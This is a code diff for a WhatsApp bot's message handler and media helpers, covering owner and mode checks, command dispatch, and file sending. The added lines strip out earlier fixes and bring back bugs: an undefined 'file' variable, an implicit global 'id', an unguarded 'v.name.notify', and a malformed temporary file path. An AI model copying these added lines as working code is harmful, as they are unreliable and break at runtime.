+      const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
       const isFileOwner = ownerFile.includes(sender);
-      const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner || creatorJids.includes(sender); // Use creatorJids for consistency
+      const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
 
       // Mode restrictions
-      // FIX: Use process.env for MODE
-      if (!isRealOwner && process.env.MODE === "private") {
+      if (!isRealOwner && config.MODE === "private") {
         console.log(chalk.red(`[ 🚫 ] Ignored command in private mode from ${sender}`));
         return;
       }
-      // FIX: Use process.env for MODE
-      if (!isRealOwner && isGroup && process.env.MODE === "inbox") {
+      if (!isRealOwner && isGroup && config.MODE === "inbox") {
         console.log(chalk.red(`[ 🚫 ] Ignored command in group ${groupName} from ${sender} in inbox mode`));
         return;
       }
-      // FIX: Use process.env for MODE
-      if (!isRealOwner && !isGroup && process.env.MODE === "groups") {
+      if (!isRealOwner && !isGroup && config.MODE === "groups") {
         console.log(chalk.red(`[ 🚫 ] Ignored command in private chat from ${sender} in groups mode`));
         return;
       }
@@ -829,38 +689,34 @@ if (!isReact && senderNumber === botNumber) {
 	  // take commands 
                  
   const events = require('./malvin')
-  const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false; // Use prefix.length for slicing body
+  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
   if (isCmd) {
   const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
   if (cmd) {
   if (cmd.react) malvin.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
   
   try {
-  // Pass correct isOwner/isCreator variables to the command function
-  cmd.function(malvin, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner: isRealOwner, isCreator: isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+  cmd.function(malvin, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
   } catch (e) {
   console.error("[PLUGIN ERROR] " + e);
   }
   }
   }
   events.commands.map(async(command) => {
-  // Note: Your condition logic for command.on is redundant/incorrect. 
-  // It should check against the message type derived from the current 'mek' object.
-  // I will keep your original logic but note the potential issue.
   if (body && command.on === "body") {
-  command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner: isRealOwner, isCreator: isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
   } else if (mek.q && command.on === "text") {
-  command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner: isRealOwner, isCreator: isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
   } else if (
   (command.on === "image" || command.on === "photo") &&
-  type === "imageMessage"
+  mek.type === "imageMessage"
   ) {
-  command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner: isRealOwner, isCreator: isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
   } else if (
   command.on === "sticker" &&
-  type === "stickerMessage"
+  mek.type === "stickerMessage"
   ) {
-  command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner: isRealOwner, isCreator: isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
   }});
   
   });
@@ -925,7 +781,7 @@ if (!isReact && senderNumber === botNumber) {
       let type = await FileType.fromBuffer(buffer)
       trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
           // save to file
-      await fsSync.writeFileSync(trueFileName, buffer) // Changed fs to fsSync here
+      await fs.writeFileSync(trueFileName, buffer)
       return trueFileName
     }
     //=================================================
@@ -1007,18 +863,18 @@ if (!isReact && senderNumber === botNumber) {
     //=====================================================
     malvin.getFile = async(PATH, save) => {
       let res
-      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fsSync.existsSync(PATH) ? (filename = PATH, fsSync.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
           //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
       let type = await FileType.fromBuffer(data) || {
           mime: 'application/octet-stream',
           ext: '.bin'
       }
-      let filename = path.join(os.tmpdir(), new Date() * 1 + '.' + type.ext) // Use os.tmpdir() for temp path
-      if (data && save) fs.promises.writeFile(filename, data) // Use fs.promises for async file write
+      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
+      if (data && save) fs.promises.writeFile(filename, data)
       return {
           res,
           filename,
-          size: data.length, // Simplified size check
+          size: await getSizeMedia(data),
           ...type,
           data
       }
@@ -1032,8 +888,6 @@ if (!isReact && senderNumber === botNumber) {
           mimetype = mime,
           pathFile = filename
       if (options.asDocument) type = 'document'
-      // Requires exif.js to be correctly implemented, commented out to prevent ReferenceError
-      /*
       if (options.asSticker || /webp/.test(mime)) {
           let { writeExif } = require('./exif.js')
           let media = { mimetype: mime, data }
@@ -1041,23 +895,17 @@ if (!isReact && senderNumber === botNumber) {
           await fs.promises.unlink(filename)
           type = 'sticker'
           mimetype = 'image/webp'
-      } else */ 
-      if (/image/.test(mime)) type = 'image'
+      } else if (/image/.test(mime)) type = 'image'
       else if (/video/.test(mime)) type = 'video'
       else if (/audio/.test(mime)) type = 'audio'
       else type = 'document'
-      
-      // Use the actual pathFile, and unlink it if it was a temp file
       await malvin.sendMessage(jid, {
-          [type]: { url: pathFile }, // Use url for the file path
+          [type]: { url: pathFile },
           mimetype,
-          fileName: fileName || pathFile,
+          fileName,
           ...options
       }, { quoted, ...options })
-      // Unlink only if a temporary file was created (i.e., if save was true in getFile)
-      // FIX: Await unlink to ensure cleanup runs after send.
-      if (types.filename) await fs.promises.unlink(pathFile) 
-      return 
+      return fs.promises.unlink(pathFile)
     }
     //=====================================================
     malvin.parseMention = async(text) => {
@@ -1067,15 +915,13 @@ if (!isReact && senderNumber === botNumber) {
     malvin.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
       let types = await malvin.getFile(path, true)
       let { mime, ext, res, data, filename } = types
-      if (res && res.status !== 200 || data.length <= 65536) { // Use data.length instead of file.length
-          try { throw { json: JSON.parse(data.toString()) } } catch (e) { if (e.json) throw e.json }
+      if (res && res.status !== 200 || file.length <= 65536) {
+          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
       }
       let type = '',
           mimetype = mime,
           pathFile = filename
       if (options.asDocument) type = 'document'
-      // Requires exif.js to be correctly implemented, commented out to prevent ReferenceError
-      /*
       if (options.asSticker || /webp/.test(mime)) {
           let { writeExif } = require('./exif')
           let media = { mimetype: mime, data }
@@ -1083,8 +929,7 @@ if (!isReact && senderNumber === botNumber) {
           await fs.promises.unlink(filename)
           type = 'sticker'
           mimetype = 'image/webp'
-      } else */ 
-      if (/image/.test(mime)) type = 'image'
+      } else if (/image/.test(mime)) type = 'image'
       else if (/video/.test(mime)) type = 'video'
       else if (/audio/.test(mime)) type = 'audio'
       else type = 'document'
@@ -1092,13 +937,10 @@ if (!isReact && senderNumber === botNumber) {
           [type]: { url: pathFile },
           caption,
           mimetype,
-          fileName: fileName || pathFile,
+          fileName,
           ...options
       }, { quoted, ...options })
-      // Unlink only if a temporary file was created (i.e., if save was true in getFile)
-      // FIX: Await unlink to ensure cleanup runs after send.
-      if (types.filename) await fs.promises.unlink(pathFile) 
-      return 
+      return fs.promises.unlink(pathFile)
     }
     /**
     *
@@ -1109,8 +951,6 @@ if (!isReact && senderNumber === botNumber) {
     */
     //=====================================================
     malvin.sendVideoAsSticker = async (jid, buff, options = {}) => {
-      // Assuming writeExifVid and videoToWebp are defined elsewhere (e.g., in './lib/exif')
-      // If not, this will fail. Leaving as-is but noting dependence.
       let buffer;
       if (options && (options.packname || options.author)) {
         buffer = await writeExifVid(buff, options);
@@ -1125,8 +965,6 @@ if (!isReact && senderNumber === botNumber) {
     };
     //=====================================================
     malvin.sendImageAsSticker = async (jid, buff, options = {}) => {
-      // Assuming writeExifImg and imageToWebp are defined elsewhere (e.g., in './lib/exif')
-      // If not, this will fail. Leaving as-is but noting dependence.
       let buffer;
       if (options && (options.packname || options.author)) {
         buffer = await writeExifImg(buff, options);
@@ -1160,7 +998,7 @@ if (!isReact && senderNumber === botNumber) {
              */
     //=====================================================
     malvin.sendImage = async(jid, path, caption = '', quoted = '', options) => {
-      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fsSync.existsSync(path) ? fsSync.readFileSync(path) : Buffer.alloc(0)
+      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
       return await malvin.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
     }
     
@@ -1224,8 +1062,7 @@ if (!isReact && senderNumber === botNumber) {
     */
     //=====================================================
     malvin.getName = (jid, withoutContact = false) => {
-            // FIX: Declare 'id' locally
-            const id = malvin.decodeJid(jid); 
+            id = malvin.decodeJid(jid);
 
             withoutContact = malvin.withoutContact || withoutContact;
 
@@ -1235,7 +1072,7 @@ if (!isReact && senderNumber === botNumber) {
                 return new Promise(async resolve => {
                     v = store.contacts[id] || {};
 
-                    if (!(v.name || v.subject)) // Fixed v.name.notify to v.name (using Baileys store format)
+                    if (!(v.name.notify || v.subject))
                         v = malvin.groupMetadata(id) || {};
 
                     resolve(
@@ -1270,12 +1107,6 @@ if (!isReact && senderNumber === botNumber) {
 
         // Vcard Functionality
         malvin.sendContact = async (jid, kon, quoted = '', opts = {}) => {
-            // Placeholder variables used to prevent ReferenceError since they are not defined globally
-            const OwnerName = "GuruTech"; 
-            const email = "support@gurutech.com"; 
-            const github = "ADDICT-HUB/X-GURU"; 
-            const location = "Earth"; 
-
             let list = [];
             for (let i of kon) {
                 list.push({
@@ -1283,13 +1114,13 @@ if (!isReact && senderNumber === botNumber) {
                     vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await malvin.getName(
                         i + '@s.whatsapp.net',
                     )}\nFN:${
-                        OwnerName
+                        global.OwnerName
                     }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
-                        email
+                        global.email
                     }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
-                        github
+                        global.github
                     }/Mercedes\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
-                        location
+                        global.location
                     };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                 });
             }
